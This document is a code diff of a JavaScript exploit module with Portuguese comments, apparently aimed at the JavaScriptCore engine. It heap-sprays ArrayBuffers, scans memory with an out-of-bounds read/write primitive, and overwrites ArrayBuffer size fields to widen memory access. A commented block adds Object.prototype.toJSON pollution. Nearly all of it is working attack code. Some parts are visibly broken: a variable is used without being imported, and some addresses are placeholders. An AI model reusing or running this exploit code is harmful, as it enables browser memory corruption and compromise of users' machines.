@@ -1,189 +1,205 @@
 // js/script3/testCorruptArrayBufferStructure.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive, oob_array_buffer_real,
     oob_write_absolute, oob_read_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-// OOB_CONFIG é importado, mas sua utilização para definir CORRUPTION_AB_CONFIG
-// deve ser feita quando a função principal é chamada, não no escopo global do módulo.
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Assumindo que KNOWN_STRUCTURE_IDS está em config.mjs
 
-// Mova a definição de CORRUPTION_AB_CONFIG para dentro da função principal
-// ou crie uma função para obtê-la.
+// --- Configuração para este Teste Específico ---
+const CORRUPTION_AB_CONFIG = {
+    // Configurações de Pulverização
+    spray_count: 200,          // Número de ArrayBuffers a pulverizar
+    victim_ab_size: 64,        // Tamanho de cada ArrayBuffer pulverizado
 
-// Função auxiliar para pulverizar ArrayBuffers
-function sprayArrayBuffers(count, size, logFn = logS3) {
-    const sprayedAbs = [];
-    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
-    for (let i = 0; i < count; i++) {
-        try {
-            sprayedAbs.push(new ArrayBuffer(size));
-        } catch (e) {
-            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
-        }
-    }
-    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
-    return sprayedAbs;
-}
+    // Configurações da Busca na Memória (com OOB)
+    // ATENÇÃO: search_base_address e search_range PRECISAM ser ajustados para seu ambiente/alvo.
+    // Estes são apenas placeholders e provavelmente não funcionarão diretamente.
+    // Você precisará de um vazamento de info ou de experimentação para encontrar uma região provável.
+    search_base_address_str: "0x200000000", // Exemplo: Início de uma região de heap JS (AJUSTAR!)
+    search_range_bytes: 0x100000,         // Ex: 1MB de busca (AJUSTAR!)
+    search_step_bytes: 0x10,              // Alinhamento para buscar (ex: tamanho do JSCell)
 
-// Esta função tentará usar um ArrayBuffer que teve seu tamanho corrompido
-async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, logFn = logS3, FNAME_PARENT = "") {
-    logFn(` -> Tentando R/W no AB corrompido (tamanho original: ${originalSize}, atual: ${ab.byteLength})`, "info", FNAME_PARENT);
-    try {
-        const corruptedDv = new DataView(ab);
-        const readOffsetBeyondOriginal = originalSize + 4; // Tentar ler/escrever um pouco além do limite original
-        const testWriteVal = 0xABABABAB;
+    // Offsets (Baseados na análise e no config.mjs)
+    // Assumindo que KNOWN_STRUCTURE_IDS.ArrayBuffer contém o ID numérico da estrutura ArrayBuffer.
+    // Se você tiver o ponteiro da estrutura em vez do ID, a lógica de verificação mudará.
+    // Para este exemplo, vamos assumir que o StructureID está no offset 0x0 da célula.
+    // E o ponteiro para ArrayBufferContents (m_impl) está em 0x10.
+    // E dentro de ArrayBufferContents, o ponteiro de dados é 0x0 e o tamanho é 0x8.
 
-        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
-            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal}...`, "info", FNAME_PARENT);
-            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
-            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
+    // Relativo ao início do JSCell do ArrayBuffer Vítima:
+    STRUCTURE_ID_OFFSET_IN_CELL: JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET || 0x0, // Verifique seu config.mjs
+    CONTENTS_IMPL_POINTER_OFFSET_IN_CELL: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || 0x10,
 
-            if (readBack === testWriteVal) {
-                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (limitada ao novo tamanho) OBTIDA! Leu ${toHex(readBack)}`, "critical", FNAME_PARENT);
-                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
-                    const potentialPtrLow = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
-                    const potentialPtrHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true);
-                    const ptr64 = new AdvancedInt64(potentialPtrLow, potentialPtrHigh);
-                    logFn(`    Lido como U64 em ${readOffsetBeyondOriginal}: ${ptr64.toString(true)}`, "leak", FNAME_PARENT);
-                }
-                return true;
-            } else {
-                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_PARENT);
-            }
-        } else {
-            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}).`, "warn", FNAME_PARENT);
-        }
-    } catch (e_rw) {
-        logFn(`    -> Erro ao tentar R/W no AB corrompido: ${e_rw.message}`, "error", FNAME_PARENT);
-    }
-    return false;
-}
+    // Relativo ao início da estrutura ArrayBufferContents (apontada por m_impl):
+    DATA_POINTER_OFFSET_IN_CONTENTS: JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET || 0x0,
+    SIZE_OFFSET_IN_CONTENTS: JSC_OFFSETS.ArrayBufferContents.SIZE_OFFSET || 0x8,
 
-const LONG_PAUSE_S3 = 2000; // Defina LONG_PAUSE_S3 se não estiver já em s3_utils.mjs
+    // Valor para corromper o tamanho
+    new_corrupted_size_value: 0x1000, // Ex: 4KB (um valor notavelmente diferente de 64)
 
+    // Controle
+    max_candidates_to_log: 10,
+    max_corruptions_to_attempt: 3, // Tentar corromper alguns para aumentar a chance
+};
+
+// --- Função Principal do Teste ---
 export async function testCorruptArrayBufferStructure() {
     const FNAME = "testCorruptArrayBufferStructure";
+    logS3(`==== INICIANDO Teste de Corrupção de Estrutura ArrayBuffer (S3) ====`, 'test', FNAME);
+    document.title = "Iniciando Corrupção AB Estrutura";
 
-    // --- Parâmetros de Teste Configuráveis ---
-    // Definir CORRUPTION_AB_CONFIG DENTRO da função para garantir que OOB_CONFIG esteja disponível.
-    const CORRUPTION_AB_CONFIG = {
-        spray_count: 200,
-        victim_ab_size: 128,
-        size_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16) || 0x18,
-        vector_ptr_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16) || 0x10,
-        corrupted_size_value: 0x7FFFFFF0,
-        corrupted_vector_target_low: 0x0,
-        corrupted_vector_target_high: 0x0,
-        // Acessar OOB_CONFIG aqui é seguro pois a função é chamada depois da inicialização dos módulos.
-        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 256,
-        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) + 256,
-        search_step: 16,
-        max_successful_corruptions_to_find: 1,
-    };
-    // --- Fim dos Parâmetros ---
-
-    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.1) ---`, "test", FNAME);
-    logS3(`   Configurações: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, ` +
-          `SizeOffset=${toHex(CORRUPTION_AB_CONFIG.size_offset_in_object)}, VectorPtrOffset=${toHex(CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object)}`, "info", FNAME);
-    logS3(`   Range de Busca (base speculativa): ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} a ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)}, Passo: ${CORRUPTION_AB_CONFIG.search_step}`, "info", FNAME);
-
-
+    let victimAbs = [];
     let successfulCorruptionsFound = 0;
 
-    for (let attempt = 0; attempt < 3; attempt++) {
-        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
+    // 1. Pulverizar ArrayBuffers
+    logS3(`Pulverizando ${CORRUPTION_AB_CONFIG.spray_count} ArrayBuffers de ${CORRUPTION_AB_CONFIG.victim_ab_size} bytes...`, "info", FNAME);
+    for (let i = 0; i < CORRUPTION_AB_CONFIG.spray_count; i++) {
+        try {
+            victimAbs.push(new ArrayBuffer(CORRUPTION_AB_CONFIG.victim_ab_size));
+        } catch (e) {
+            logS3(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${CORRUPTION_AB_CONFIG.spray_count}: ${e.message}`, "warn", FNAME);
+            if (victimAbs.length < CORRUPTION_AB_CONFIG.spray_count / 2) { // Se muitas falhas, abortar
+                logS3("Muitas falhas na pulverização. Abortando teste.", "error", FNAME);
+                return;
+            }
+        }
+    }
+    logS3(`${victimAbs.length} ArrayBuffers pulverizados.`, "good", FNAME);
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-        logS3(`Tentativa de Corrupção de AB #${attempt + 1}...`, "test", FNAME);
-        // Certifique-se que updateOOBConfigFromUI é chamado dentro de triggerOOB_primitive ou antes,
-        // se os valores de OOB_CONFIG podem mudar dinamicamente pela UI.
-        // A importação de OOB_CONFIG já traz os valores default ou os atualizados se updateOOBConfigFromUI
-        // já foi chamado no fluxo de inicialização do core_exploit.
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real) {
-            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
-            continue;
+    // 2. Configurar Primitiva OOB
+    await triggerOOB_primitive();
+    if (!oob_array_buffer_real || !oob_dataview_real) {
+        logS3("Falha ao configurar ambiente OOB. Abortando teste de corrupção.", "error", FNAME);
+        return;
+    }
+    logS3("Ambiente OOB configurado para busca e corrupção.", "info", FNAME);
+    document.title = "OOB OK, Buscando ABs...";
+
+    // 3. Buscar e Tentar Corromper
+    const searchBaseAddr = new AdvancedInt64(CORRUPTION_AB_CONFIG.search_base_address_str);
+    const searchEndAddr = searchBaseAddr.add(new AdvancedInt64(CORRUPTION_AB_CONFIG.search_range_bytes));
+    let candidatesLogged = 0;
+
+    logS3(`Iniciando busca por ArrayBuffers na memória de ${searchBaseAddr.toString(true)} a ${searchEndAddr.toString(true)}`, "info", FNAME);
+
+    for (let currentSearchOffset = searchBaseAddr;
+         currentSearchOffset.lessThan(searchEndAddr) && successfulCorruptionsFound < CORRUPTION_AB_CONFIG.max_corruptions_to_attempt;
+         currentSearchOffset = currentSearchOffset.add(new AdvancedInt64(CORRUPTION_AB_CONFIG.search_step_bytes)))
+    {
+        if (currentSearchOffset.low() % (CORRUPTION_AB_CONFIG.search_range_bytes / 100) < CORRUPTION_AB_CONFIG.search_step_bytes ) { // Log de progresso
+             document.title = `Buscando... ${currentSearchOffset.toString(true)}`;
         }
 
-        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
-        if (victimAbs.length === 0) {
-            clearOOBEnvironment();
-            continue;
-        }
-        await PAUSE_S3(MEDIUM_PAUSE_S3);
+        try {
+            // Ler o StructureID (ou ponteiro para Structure) no início da célula candidata
+            const candidateStructureIDPtrOrVal = oob_read_absolute(currentSearchOffset.add(CORRUPTION_AB_CONFIG.STRUCTURE_ID_OFFSET_IN_CELL), 8); // Ler 8 bytes (ptr ou val+flags)
+            if (!isAdvancedInt64Object(candidateStructureIDPtrOrVal)) continue; // Erro na leitura
 
-        for (let baseCandidateOffset = CORRUPTION_AB_CONFIG.search_base_offset_start;
-             baseCandidateOffset < CORRUPTION_AB_CONFIG.search_base_offset_end;
-             baseCandidateOffset += CORRUPTION_AB_CONFIG.search_step) {
+            // Lógica de Verificação do StructureID (SIMPLIFICADA - AJUSTAR CONFORME SEU CASO)
+            // Se KNOWN_STRUCTURE_IDS.ArrayBuffer for um ID numérico esperado diretamente no offset 0x0 (como uint32_t)
+            // E os próximos 4 bytes forem flags. Este é um exemplo.
+            // A forma mais robusta é ler o ponteiro para Structure e depois o ID dentro dela.
+            // Para este script, vamos assumir que você tem um ID numérico em KNOWN_STRUCTURE_IDS.ArrayBuffer.
+            // E que o ID está nos primeiros 4 bytes do candidateStructureIDPtrOrVal (parte baixa).
+            const candidateID_low32 = candidateStructureIDPtrOrVal.low(); // Assumindo ID é uint32
+            if (KNOWN_STRUCTURE_IDS && KNOWN_STRUCTURE_IDS.ArrayBuffer && candidateID_low32 !== KNOWN_STRUCTURE_IDS.ArrayBuffer) {
+                continue; // Não é o StructureID esperado para ArrayBuffer
+            } else if (!KNOWN_STRUCTURE_IDS || !KNOWN_STRUCTURE_IDS.ArrayBuffer) {
+                if (candidatesLogged < CORRUPTION_AB_CONFIG.max_candidates_to_log && currentSearchOffset.low() % (1024*16) === 0) { // Log menos frequente se ID desconhecido
+                    logS3(`  Candidato em ${currentSearchOffset.toString(true)} com ID/Ptr Low32: ${toHex(candidateID_low32)}. KNOWN_STRUCTURE_IDS.ArrayBuffer não definido.`, "warn", FNAME);
+                    candidatesLogged++;
+                }
+                continue; // Pula se não temos um ID conhecido para comparar
+            }
 
-            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
+            logS3(`[CANDIDATO AB ENCONTRADO] Possível ArrayBuffer em ${currentSearchOffset.toString(true)} com ID Low32: ${toHex(candidateID_low32)}`, "vuln", FNAME);
+            document.title = `Candidato AB ${currentSearchOffset.toString(true)}`;
 
-            if (baseCandidateOffset < 0 || baseCandidateOffset >= oob_array_buffer_real.byteLength) continue;
-
-            const absOffsetForVictimSize = baseCandidateOffset + CORRUPTION_AB_CONFIG.size_offset_in_object;
-            const absOffsetForVictimVectorPtr = baseCandidateOffset + CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object;
-
-            let willAttemptWriteSize = (absOffsetForVictimSize >= 0 && absOffsetForVictimSize + 4 <= oob_array_buffer_real.byteLength);
-            let willAttemptWriteVector = (absOffsetForVictimVectorPtr >= 0 && absOffsetForVictimVectorPtr + 8 <= oob_array_buffer_real.byteLength);
-
-            if (!willAttemptWriteSize && !willAttemptWriteVector) {
+            // Ler o ponteiro para ArrayBufferContents (m_impl)
+            const contentsImplPtrAddr = currentSearchOffset.add(CORRUPTION_AB_CONFIG.CONTENTS_IMPL_POINTER_OFFSET_IN_CELL);
+            const contentsImplPtr = oob_read_absolute(contentsImplPtrAddr, 8); // Ler ponteiro de 64 bits
+            if (!isAdvancedInt64Object(contentsImplPtr) || contentsImplPtr.equals(new AdvancedInt64(0))) {
+                logS3(`  Falha ao ler m_impl válido em ${contentsImplPtrAddr.toString(true)} ou é nulo. Pulando.`, "warn", FNAME);
                 continue;
             }
-            logS3(` Testando base especulativa ${toHex(baseCandidateOffset)} para um ArrayBuffer...`, "info", FNAME);
+            logS3(`  m_impl (ArrayBufferContents*) lido de ${contentsImplPtrAddr.toString(true)}: ${contentsImplPtr.toString(true)}`, "info", FNAME);
 
-            if (willAttemptWriteSize) {
-                const originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSize, 4);
-                logS3(`  -> Escrevendo tamanho ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)} em abs offset ${toHex(absOffsetForVictimSize)} (Original: ${toHex(originalValueAtSizeOffset)})`, "info", FNAME);
-                oob_write_absolute(absOffsetForVictimSize, CORRUPTION_AB_CONFIG.corrupted_size_value, 4);
+            // Calcular endereço do campo de tamanho DENTRO de ArrayBufferContents
+            const sizeFieldAddrInContents = contentsImplPtr.add(CORRUPTION_AB_CONFIG.SIZE_OFFSET_IN_CONTENTS);
 
-                for (let i = 0; i < victimAbs.length; i++) {
-                    if (!victimAbs[i]) continue;
-                    try {
-                        if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
-                            logS3(`  !!! SUCESSO DE CORRUPÇÃO DE TAMANHO !!! ArrayBuffer pulverizado ${i} teve byteLength alterado para ${toHex(victimAbs[i].byteLength)}!`, "vuln", FNAME);
-                            logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffset)}`, "vuln", FNAME);
-                            logS3(`     Offset absoluto do campo de tamanho corrompido: ${toHex(absOffsetForVictimSize)}`, "vuln", FNAME);
-                            if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, logS3, FNAME)) {
-                                successfulCorruptionsFound++;
-                                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
-                            }
-                        }
-                    } catch (e_check) { /* Erro ao acessar byteLength pode acontecer se o objeto estiver muito corrompido */ }
-                }
-                 // Restaurar (idealmente): oob_write_absolute(absOffsetForVictimSize, originalValueAtSizeOffset, 4);
+            // Ler o tamanho original DENTRO de ArrayBufferContents
+            const originalSizeInContents = oob_read_absolute(sizeFieldAddrInContents, 8); // Tamanho é size_t (64-bit)
+            if (!isAdvancedInt64Object(originalSizeInContents)) {
+                 logS3(`  Falha ao ler tamanho original em ${sizeFieldAddrInContents.toString(true)}. Pulando.`, "warn", FNAME);
+                continue;
             }
-            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
-            await PAUSE_S3(SHORT_PAUSE_S3);
+            logS3(`  Tamanho original lido de [m_impl + SIZE_OFFSET]: ${originalSizeInContents.toString(true)} (${originalSizeInContents.low()}) bytes em ${sizeFieldAddrInContents.toString(true)}`, "info", FNAME);
 
-            if (willAttemptWriteVector) {
-                const originalVectorPtr = oob_read_absolute(absOffsetForVictimVectorPtr, 8);
-                const newVectorPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.corrupted_vector_target_low, CORRUPTION_AB_CONFIG.corrupted_vector_target_high);
-                logS3(`  -> Escrevendo ponteiro de vetor ${newVectorPtr.toString(true)} em abs offset ${toHex(absOffsetForVictimVectorPtr)} (Original: ${isAdvancedInt64Object(originalVectorPtr) ? originalVectorPtr.toString(true) : toHex(originalVectorPtr)})`, "info", FNAME);
-                oob_write_absolute(absOffsetForVictimVectorPtr, newVectorPtr, 8);
-
-                for (let i = 0; i < victimAbs.length; i++) {
-                    if (!victimAbs[i]) continue;
-                    try {
-                        const dvCheck = new DataView(victimAbs[i]);
-                        const firstByte = dvCheck.getUint8(0); // Tenta ler
-                        logS3(`  AB ${i} após corrupção de vetor: byteLength=${victimAbs[i].byteLength}, 1stByte lido=${toHex(firstByte, 8)}.`, "info", FNAME);
-                    } catch (e_check_vec) {
-                        logS3(`  !!! POTENCIAL UAF/CORRUPÇÃO DE VETOR !!! Erro ao acessar AB ${i} após corrupção de vetor: ${e_check_vec.message}`, "critical", FNAME);
-                        logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffset)}`, "vuln", FNAME);
-                        logS3(`     Offset absoluto do campo de vetor corrompido: ${toHex(absOffsetForVictimVectorPtr)}`, "vuln", FNAME);
-                        successfulCorruptionsFound++;
-                        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
-                    }
-                }
-                // Restaurar (idealmente): oob_write_absolute(absOffsetForVictimVectorPtr, originalVectorPtr, 8);
+            // Verificar se o tamanho original corresponde ao esperado (ex: 64)
+            if (originalSizeInContents.low() !== CORRUPTION_AB_CONFIG.victim_ab_size) {
+                logS3(`  Tamanho original (${originalSizeInContents.low()}) não corresponde ao esperado (${CORRUPTION_AB_CONFIG.victim_ab_size}). Provavelmente não é um dos nossos ABs pulverizados ou já corrompido. Pulando.`, "warn", FNAME);
+                continue;
             }
-             if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
+
+            // TENTAR CORROMPER O TAMANHO DENTRO DE ArrayBufferContents
+            logS3(`  >>> TENTANDO CORROMPER TAMANHO em ${sizeFieldAddrInContents.toString(true)} para ${toHex(CORRUPTION_AB_CONFIG.new_corrupted_size_value)} <<<`, "critical", FNAME);
+            document.title = `Corrompendo ${sizeFieldAddrInContents.toString(true)}`;
+            oob_write_absolute(sizeFieldAddrInContents, new AdvancedInt64(CORRUPTION_AB_CONFIG.new_corrupted_size_value), 8); // Escrever novo tamanho (64-bit)
+
+            // Verificar se a corrupção teve efeito em algum ArrayBuffer no JS
+            let corruptionVerified = false;
+            for (let i = 0; i < victimAbs.length; i++) {
+                if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.new_corrupted_size_value) {
+                    logS3(`  !!!!!! SUCESSO NA CORRUPÇÃO !!!!!! ArrayBuffer[${i}] agora tem byteLength = ${victimAbs[i].byteLength}`, "leak", FNAME);
+                    logS3(`     Endereço do JSCell corrompido (especulativo): ${currentSearchOffset.toString(true)}`, "leak", FNAME);
+                    document.title = `SUCESSO Corrupção AB ${i}!`;
+                    successfulCorruptionsFound++;
+                    corruptionVerified = true;
+
+                    // AGORA, VOCÊ PODERIA CHAMAR JSON.stringify NESTE victimAbs[i] CORROMPIDO
+                    // PARA VER SE A `detailed_toJSON` COM LEITURA ESTENDIDA CONSEGUE LER OOB.
+                    // Exemplo:
+                    // logS3(`     Chamando JSON.stringify no ArrayBuffer[${i}] corrompido...`, "test", FNAME);
+                    // try {
+                    //    let ppKeyToPollute = 'toJSON'; // Do config
+                    //    let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
+                    //    Object.defineProperty(Object.prototype, ppKeyToPollute, { value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, writable:true, configurable:true}); // Importar esta função
+                    //    let res = JSON.stringify(victimAbs[i]);
+                    //    logS3(`     Resultado do stringify: ${res.substring(0,200)}`, "info", FNAME);
+                    //    if (originalToJSON) Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSON); else delete Object.prototype[ppKeyToPollute];
+                    // } catch (e_stringify) {
+                    //    logS3(`     Erro ao chamar stringify no AB corrompido: ${e_stringify.message}`, "error", FNAME);
+                    // }
+                    break; 
+                }
+            }
+            if (corruptionVerified && successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_corruptions_to_attempt) break;
+
+            if (!corruptionVerified) {
+                logS3(`  Corrupção do tamanho em ${sizeFieldAddrInContents.toString(true)} não refletiu em nenhum AB no JS. Restaurando (tentativa)...`, "warn", FNAME);
+                oob_write_absolute(sizeFieldAddrInContents, originalSizeInContents, 8); // Tenta restaurar
+            }
+
+        } catch (e_search) {
+            if (e_search.message.includes("bounds")) { // Erro comum de leitura OOB se o DataView for pequeno
+                // Ignorar silenciosamente ou logar com menos frequência
+            } else {
+                logS3(`  Erro durante a busca/corrupção em ${currentSearchOffset.toString(true)}: ${e_search.message}`, "error", FNAME);
+            }
         }
-        clearOOBEnvironment();
-        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
-        await PAUSE_S3(LONG_PAUSE_S3);
     }
 
-    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
+    document.title = "Busca Concluída";
+    logS3(`Busca na memória concluída. Corrupções bem-sucedidas detectadas: ${successfulCorruptionsFound}.`, "info", FNAME);
+    clearOOBEnvironment();
+    logS3(`==== Teste de Corrupção de Estrutura ArrayBuffer CONCLUÍDO ====`, 'test', FNAME);
 }
+
+// Para chamar este teste, você o importaria em runAllAdvancedTestsS3.mjs e o executaria.
+// Exemplo de como chamá-lo (em runAllAdvancedTestsS3.mjs):
+// import { testCorruptArrayBufferStructure } from './testCorruptArrayBufferStructure.mjs';
+// ...
+// await testCorruptArrayBufferStructure();
